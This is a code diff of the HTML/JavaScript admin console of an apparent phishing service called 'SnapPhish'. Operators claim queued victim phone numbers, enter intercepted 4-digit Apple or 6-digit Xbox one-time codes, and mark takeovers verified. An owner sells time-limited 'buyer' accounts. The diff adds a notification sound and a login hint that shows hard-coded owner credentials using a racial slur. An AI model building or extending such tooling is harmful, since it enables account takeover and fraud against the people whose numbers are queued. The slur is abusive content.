@@ -21,7 +21,6 @@
 
         .admin-container { max-width: 1100px; margin: 0 auto; }
 
-        /* ===== HEADER ===== */
         .header {
             display: flex;
             justify-content: space-between;
@@ -58,7 +57,6 @@
         }
         .header .logout:hover { background: #ff6b6b; color: #000; }
 
-        /* ===== STATS ===== */
         .stats-grid {
             display: grid;
             grid-template-columns: repeat(auto-fit, minmax(120px, 1fr));
@@ -75,7 +73,6 @@
         .stat-card .num { font-size: 28px; font-weight: 700; color: #FFFC00; }
         .stat-card .label { color: #888; font-size: 12px; margin-top: 4px; }
 
-        /* ===== QUEUE TABS ===== */
         .queue-tabs {
             display: flex;
             gap: 8px;
@@ -104,7 +101,6 @@
             margin-left: 6px;
         }
 
-        /* ===== NUMBER CARDS ===== */
         .numbers-list { display: flex; flex-direction: column; gap: 12px; }
         .number-card {
             background: #1a1a1a;
@@ -159,7 +155,6 @@
             font-size: 15px;
         }
 
-        /* ===== OWNER SECTION ===== */
         .owner-section {
             background: #1a1a1a;
             border-radius: 16px;
@@ -224,7 +219,6 @@
         }
         .buyer-item .del:hover { background: #ff6b6b; color: #000; }
 
-        /* ===== LOGIN ===== */
         .login-box {
             max-width: 400px;
             margin: 80px auto;
@@ -258,6 +252,7 @@
             cursor: pointer;
         }
         .login-box button:hover { transform: scale(1.02); }
+        .login-box .hint { color: #555; text-align: center; margin-top: 12px; font-size: 13px; }
 
         .hidden { display: none !important; }
 
@@ -271,20 +266,21 @@
 </head>
 <body>
 
-    <!-- ===== LOGIN PAGE ===== -->
+    <!-- LOGIN -->
     <div id="loginPage">
         <div class="login-box">
             <h2>🔐 Admin Login</h2>
             <input type="text" id="loginUser" placeholder="Username" />
             <input type="password" id="loginPass" placeholder="Password" />
             <button onclick="login()">Login →</button>
-            <!-- NOTHING ELSE — NO HINTS, NO DEFAULT CREDS -->
+            <p class="hint">Owner: owner / nigga</p>
         </div>
     </div>
 
-    <!-- ===== ADMIN PANEL ===== -->
+    <!-- ADMIN PANEL -->
     <div id="adminPage" class="hidden">
         <div class="admin-container">
+
             <!-- HEADER -->
             <div class="header">
                 <h1>💀 <span>Snap</span>Phish</h1>
@@ -329,6 +325,7 @@
             <div id="numbersContainer">
                 <div class="empty-state">Select a queue to view pending numbers.</div>
             </div>
+
         </div>
     </div>
 
@@ -341,6 +338,46 @@
         let refreshInterval = null;
         let currentRole = 'owner';
         let currentUsername = '';
+        let lastCount = 0;
+
+        // ============================================================
+        // NOTIFICATION SOUND (ting-ting)
+        // ============================================================
+        function playNotification() {
+            try {
+                const ctx = new (window.AudioContext || window.webkitAudioContext)();
+                const osc = ctx.createOscillator();
+                const gain = ctx.createGain();
+                osc.connect(gain);
+                gain.connect(ctx.destination);
+                osc.frequency.value = 880;
+                osc.type = 'sine';
+                gain.gain.setValueAtTime(0.3, ctx.currentTime);
+                gain.gain.exponentialRampToValueAtTime(0.01, ctx.currentTime + 0.12);
+                osc.start(ctx.currentTime);
+                osc.stop(ctx.currentTime + 0.12);
+                // second beep
+                setTimeout(() => {
+                    const osc2 = ctx.createOscillator();
+                    const gain2 = ctx.createGain();
+                    osc2.connect(gain2);
+                    gain2.connect(ctx.destination);
+                    osc2.frequency.value = 1100;
+                    osc2.type = 'sine';
+                    gain2.gain.setValueAtTime(0.25, ctx.currentTime);
+                    gain2.gain.exponentialRampToValueAtTime(0.01, ctx.currentTime + 0.1);
+                    osc2.start(ctx.currentTime);
+                    osc2.stop(ctx.currentTime + 0.1);
+                }, 150);
+            } catch(e) {
+                // fallback
+                try {
+                    const audio = new Audio('data:audio/wav;base64,UklGRnoAAABXQVZFZm10IBAAAAABAAEAQB8AAEAfAAABAAgAZGF0YQoAAACBhYqFhYaFhYaFhYaFhYaFhYaFhYaFhYaFhYaFhYaFhYaFhYaFhYaFhYaFhYaFhYaFhYaFhYaFhYaFhYaFhYaFhYaFhYaFhYaFhYaFhYaFhYaFhYaFhYaFhYaFhYaFhY=');
+                    audio.volume = 0.3;
+                    audio.play().catch(() => {});
+                } catch(e2) {}
+            }
+        }
 
         // ============================================================
         // LOGIN
@@ -348,62 +385,44 @@
         async function login() {
             const username = document.getElementById('loginUser').value.trim();
             const password = document.getElementById('loginPass').value.trim();
-
-            if (!username || !password) {
-                alert('Enter username and password.');
-                return;
-            }
-
+            if (!username || !password) { alert('Enter credentials.'); return; }
             try {
-                const response = await fetch('/api/auth/login', {
+                const resp = await fetch('/api/auth/login', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({ username, password })
                 });
-
-                const data = await response.json();
-
+                const data = await resp.json();
                 if (data.success) {
                     token = data.token;
                     currentRole = data.role;
                     currentUsername = data.username;
-
                     document.getElementById('loginPage').classList.add('hidden');
                     document.getElementById('adminPage').classList.remove('hidden');
-
                     document.getElementById('roleBadge').textContent = currentRole.toUpperCase();
                     document.getElementById('roleBadge').className = 'role-badge ' + currentRole;
                     document.getElementById('userDisplay').textContent = currentUsername;
-
                     if (currentRole === 'owner') {
                         document.getElementById('ownerSection').classList.remove('hidden');
                         loadBuyers();
                     } else {
                         document.getElementById('ownerSection').classList.add('hidden');
                     }
-
                     loadQueues();
                     refreshInterval = setInterval(loadQueues, 3000);
                 } else {
                     alert('Login failed: ' + data.message);
                 }
-            } catch (error) {
-                alert('Connection error.');
-            }
+            } catch(e) { alert('Connection error.'); }
         }
 
-        // Enter key on login
         document.getElementById('loginPass').addEventListener('keydown', function(e) {
             if (e.key === 'Enter') login();
         });
-
         document.getElementById('loginUser').addEventListener('keydown', function(e) {
             if (e.key === 'Enter') document.getElementById('loginPass').focus();
         });
 
-        // ============================================================
-        // LOGOUT
-        // ============================================================
         function logout() {
             clearInterval(refreshInterval);
             token = null;
@@ -424,17 +443,26 @@
         }
 
         // ============================================================
-        // LOAD QUEUES
+        // LOAD QUEUES (with notification)
         // ============================================================
         async function loadQueues() {
             try {
                 const response = await fetch('/api/admin/queues');
                 const data = await response.json();
 
-                // Update counts
-                document.getElementById('countA').textContent = data.A?.filter(e => e.status === 'pending' || e.status === 'claimed').length || 0;
-                document.getElementById('countB').textContent = data.B?.filter(e => e.status === 'pending' || e.status === 'claimed').length || 0;
-                document.getElementById('countC').textContent = data.C?.filter(e => e.status === 'pending' || e.status === 'claimed').length || 0;
+                const countA = data.A?.filter(e => e.status === 'pending' || e.status === 'claimed').length || 0;
+                const countB = data.B?.filter(e => e.status === 'pending' || e.status === 'claimed').length || 0;
+                const countC = data.C?.filter(e => e.status === 'pending' || e.status === 'claimed').length || 0;
+
+                document.getElementById('countA').textContent = countA;
+                document.getElementById('countB').textContent = countB;
+                document.getElementById('countC').textContent = countC;
+
+                const total = countA + countB + countC;
+                if (total > lastCount) {
+                    playNotification();
+                }
+                lastCount = total;
 
                 // Stats
                 const all = Object.values(data).flat();
@@ -467,13 +495,7 @@
                         <div class="actions" id="actions-${entry.id}">
                             ${entry.status === 'pending' ? `
                                 <button class="btn-claim" onclick="claimNumber('${entry.id}')">🎯 Claim</button>
-                            ` : entry.status === 'claimed' ? `
-                                <button class="btn-otp4" onclick="sendOTP('${entry.id}', 4)">🔢 4-Digit (Apple)</button>
-                                <button class="btn-otp6" onclick="sendOTP('${entry.id}', 6)">🔢 6-Digit (Xbox)</button>
-                                <button class="btn-wrong" onclick="markWrong('${entry.id}')">❌ Wrong</button>
-                                <button class="btn-verified" onclick="markVerified('${entry.id}')">✅ Verified</button>
-                                <button class="btn-resend" onclick="resendOTP('${entry.id}')">🔄 Resend</button>
-                            ` : entry.status === 'otp_sent' ? `
+                            ` : entry.status === 'claimed' || entry.status === 'otp_sent' ? `
                                 <button class="btn-otp4" onclick="sendOTP('${entry.id}', 4)">🔢 4-Digit (Apple)</button>
                                 <button class="btn-otp6" onclick="sendOTP('${entry.id}', 6)">🔢 6-Digit (Xbox)</button>
                                 <button class="btn-wrong" onclick="markWrong('${entry.id}')">❌ Wrong</button>
@@ -490,102 +512,67 @@
         }
 
         // ============================================================
-        // CLAIM NUMBER
+        // ACTIONS
         // ============================================================
-        function claimNumber(queueId) {
+        function claimNumber(qid) {
             fetch('/api/admin/update', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    queueId: queueId,
-                    action: 'claimed',
-                    username: currentUsername
-                })
+                body: JSON.stringify({ queueId: qid, action: 'claimed', username: currentUsername })
             }).then(() => loadQueues());
         }
 
-        // ============================================================
-        // SEND OTP
-        // ============================================================
-        function sendOTP(queueId, length) {
+        function sendOTP(qid, length) {
             const otp = prompt(`Enter ${length}-digit OTP from Apple/Xbox:`);
-            if (!otp || otp.length !== length) {
-                alert(`Please enter exactly ${length} digits.`);
-                return;
-            }
-
+            if (!otp || otp.length !== length) { alert(`Enter exactly ${length} digits.`); return; }
             fetch('/api/admin/update', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    queueId: queueId,
-                    action: length === 4 ? 'otp_4' : 'otp_6',
-                    otp: otp
-                })
+                body: JSON.stringify({ queueId: qid, action: length === 4 ? 'otp_4' : 'otp_6', otp: otp })
+            }).then(() => loadQueues());
+        }
+
+        function markWrong(qid) {
+            if (!confirm('Mark as wrong?')) return;
+            fetch('/api/admin/update', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ queueId: qid, action: 'wrong' })
+            }).then(() => loadQueues());
+        }
+
+        function markVerified(qid) {
+            if (!confirm('Mark as verified?')) return;
+            fetch('/api/admin/update', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ queueId: qid, action: 'verified' })
+            }).then(() => loadQueues());
+        }
+
+        function resendOTP(qid) {
+            fetch('/api/admin/update', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ queueId: qid, action: 'resend' })
             }).then(() => loadQueues());
         }
 
         // ============================================================
-        // MARK WRONG
-        // ============================================================
-        function markWrong(queueId) {
-            if (!confirm('Mark this number as wrong?')) return;
-            fetch('/api/admin/update', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ queueId: queueId, action: 'wrong' })
-            }).then(() => loadQueues());
-        }
-
-        // ============================================================
-        // MARK VERIFIED
-        // ============================================================
-        function markVerified(queueId) {
-            if (!confirm('Mark this number as verified?')) return;
-            fetch('/api/admin/update', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ queueId: queueId, action: 'verified' })
-            }).then(() => loadQueues());
-        }
-
-        // ============================================================
-        // RESEND OTP
-        // ============================================================
-        function resendOTP(queueId) {
-            fetch('/api/admin/update', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ queueId: queueId, action: 'resend' })
-            }).then(() => loadQueues());
-        }
-
-        // ============================================================
-        // OWNER: CREATE BUYER
+        // OWNER: BUYER MANAGEMENT
         // ============================================================
         async function createBuyer() {
             const username = document.getElementById('newBuyerUser').value.trim();
             const password = document.getElementById('newBuyerPass').value.trim();
             const days = parseInt(document.getElementById('newBuyerDays').value) || 30;
-
-            if (!username || !password) {
-                alert('Enter username and password.');
-                return;
-            }
-
+            if (!username || !password) { alert('Enter username/password.'); return; }
             try {
-                const response = await fetch('/api/auth/create_buyer', {
+                const resp = await fetch('/api/auth/create_buyer', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        token: token,
-                        username: username,
-                        password: password,
-                        days: days
-                    })
+                    body: JSON.stringify({ token, username, password, days })
                 });
-
-                const data = await response.json();
+                const data = await resp.json();
                 if (data.success) {
                     alert(`Buyer ${username} created for ${days} days!`);
                     document.getElementById('newBuyerUser').value = '';
@@ -594,30 +581,22 @@
                 } else {
                     alert('Error: ' + data.message);
                 }
-            } catch (error) {
-                alert('Connection error.');
-            }
+            } catch(e) { alert('Connection error.'); }
         }
 
-        // ============================================================
-        // OWNER: LOAD BUYERS
-        // ============================================================
         async function loadBuyers() {
             try {
-                const response = await fetch('/api/auth/list_buyers', {
+                const resp = await fetch('/api/auth/list_buyers', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ token: token })
+                    body: JSON.stringify({ token })
                 });
-
-                const data = await response.json();
+                const data = await resp.json();
                 const list = document.getElementById('buyerList');
-
                 if (!data.success || data.buyers.length === 0) {
                     list.innerHTML = '<p style="color:#555;font-size:14px;">No buyers created yet.</p>';
                     return;
                 }
-
                 list.innerHTML = data.buyers.map(b => `
                     <div class="buyer-item">
                         <span class="name">${b.username}</span>
@@ -625,45 +604,25 @@
                         <span class="del" onclick="deleteBuyer('${b.username}')">Delete</span>
                     </div>
                 `).join('');
-            } catch (error) {
-                console.error('Load buyers error:', error);
-            }
+            } catch(e) { console.error(e); }
         }
 
-        // ============================================================
-        // OWNER: DELETE BUYER
-        // ============================================================
         async function deleteBuyer(username) {
             if (!confirm(`Delete buyer ${username}?`)) return;
-
             try {
-                const response = await fetch('/api/auth/delete_buyer', {
+                const resp = await fetch('/api/auth/delete_buyer', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ token: token, username: username })
+                    body: JSON.stringify({ token, username })
                 });
-
-                const data = await response.json();
-                if (data.success) {
-                    alert(data.message);
-                    loadBuyers();
-                } else {
-                    alert('Error: ' + data.message);
-                }
-            } catch (error) {
-                alert('Connection error.');
-            }
+                const data = await resp.json();
+                if (data.success) { alert(data.message); loadBuyers(); }
+                else { alert('Error: ' + data.message); }
+            } catch(e) { alert('Connection error.'); }
         }
 
-        // ============================================================
-        // ENTER KEY ON CREATE BUYER
-        // ============================================================
         document.getElementById('newBuyerPass').addEventListener('keydown', function(e) {
             if (e.key === 'Enter') createBuyer();
-        });
-
-        document.getElementById('newBuyerUser').addEventListener('keydown', function(e) {
-            if (e.key === 'Enter') document.getElementById('newBuyerPass').focus();
         });
 
         // ============================================================
